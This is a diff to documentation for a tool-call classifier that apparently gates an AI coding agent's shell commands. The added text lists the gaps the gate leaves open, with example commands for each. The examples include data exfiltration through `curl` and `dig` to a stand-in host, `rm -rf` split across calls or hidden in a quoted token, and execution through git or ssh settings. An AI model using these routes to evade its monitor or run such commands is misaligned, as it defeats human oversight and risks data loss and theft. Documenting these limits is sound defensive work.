@@ -69,17 +69,35 @@ anything.
 
 ### The classifier is not a sandbox
 
-Nothing short of a sandbox sees everything. These are not caught, in any install:
+Nothing short of a sandbox sees everything. A gate that holds normal work gets uninstalled, so these are left unflagged on purpose:
 
+- a plain `git push`. A force push or a deleted remote ref is held
+- `rm -f` of one named file, `mv` of ordinary files, and `sed -i`
+- ordinary writes: overwriting a file with new content looks like normal work, whether it comes from `>`, `sleep 0 > f`, `python3 -c 'open("f","w")'` or the Write tool
+- stopping processes by a general name, such as `pkill node` or `kill $(pgrep -f server)`. If the daemon is among them, tool calls are blocked until it is back, so this stops work without opening the gate
+
+These are not caught, in any install:
+
+- exfiltration through a route the rules do not read: `scp`, `rsync` to a remote host, `ssh host < f`, a push to a new remote, data in a plain argument such as `curl "https://x/?d=$(cat f)"` or `dig "$(cat f).x"`, and inline code that opens its own socket. Uploads with `curl -d @f`, `curl -T`, `curl -F x=@f`, `wget --post-file` and piped `nc` or `socat` are held, and reading a known secret file is held whatever reads it
 - two-stage attacks: write a script, then run it
-- code built from strings at run time
+- anything split across tool calls, such as `mv victim tmp` and then `rm -rf tmp`. Each call is read alone, so the same pair in one command is held and in two is not
+- code built from strings at run time. `node -e 'require(x)'` is held, but a string spliced together and handed to a function the rules do not name is not
 - programs with their own execute options, such as `sed e` or `rsync -e`
-- ordinary writes: overwriting a file with new content looks like normal work, whether it comes from `>` or the Write tool
+- a program started through settings it reads, which reaches as far as running that program directly: `git -c core.hooksPath=DIR`, `GIT_EDITOR=/tmp/e git commit`, `ssh -F /tmp/c`, `SHELL=/tmp/e vim`, `npx some-package`, `open -a Terminal x.command`
 - commands held in a variable, such as `npx -c "$CMD"`, since flagging those would flag every `-c "$CONFIG"`
 - an unknown program given plain trailing words, such as `sometool git reset --hard`. `rm -r`, disk wipers and about 40 known runners are read this way, but `vagrant reboot` and `git rm` have to pass
-- `git -c core.hooksPath=DIR`, encoded commands such as `git clone 'ext::sh -c rm% -rf% x'`, and archives extracted over existing files
-- other commands that print nothing and redirect into a file, such as `sleep 0 > f`
+- tools with a side effect the rules do not name: `brew uninstall`, `pip uninstall`, `npm uninstall -g`, `systemctl stop`, `launchctl unload`, `networksetup`, `pmset`, `stripe charges create`, and other agents' own skip-permission modes. `apt`, `dnf`, `yum` and `pacman` removals are held, and a nested `claude` is held when it skips hooks or moves its config
+- the text of a prompt handed to `Agent`, `CronCreate`, `Workflow` or `RemoteTrigger`, and the `PowerShell` tool
+- archives extracted over existing files, outside the home and settings folders
 - recursive reads from home that reach the state folder, such as `grep -r token ~`. It holds no secrets, only public keys and token hashes
+- an MCP tool with an innocent name and its danger in a key the rules do not read. Tools named for running, executing, shells, commands or writing are held, and `command`, `cmd`, `script`, `sql`, `path`, `file` and their kin are read at any depth, but `mcp__x__do {"body": "..."}` passes
+- a guard port reached through a variable or through DNS of your own, such as `curl 127.0.0.1:$P`. The port's own token and `Host` checks are the boundary, not this rule
+
+Redaction has its own limits:
+
+- a secret in base64 or any other encoding a pattern cannot read. A pattern matches shapes, and encoded text has none. Long blobs are hidden, a short one is not, and percent escapes are the one encoding that is decoded first
+- a quoted secret holding a shell control character (`;`, `&`, `|`, `<`, `>`, a backtick or `$(`). A pattern cannot tell live quotes from quoted quotes: in `echo 'TOKEN="'; rm -rf ~; echo '"'` the "quoted value" is a command, and hiding a command from the person signing is the worse failure
+- only the first and last 8,000 characters are read. The rest is replaced with a marker saying how much was cut, so it cannot leak and a person is told it was not shown
 
 The classifier exists so that a tired model's `rm -rf` reaches a person. If you need to contain a hostile process, use
 Claude Code's sandbox or a VM as well.
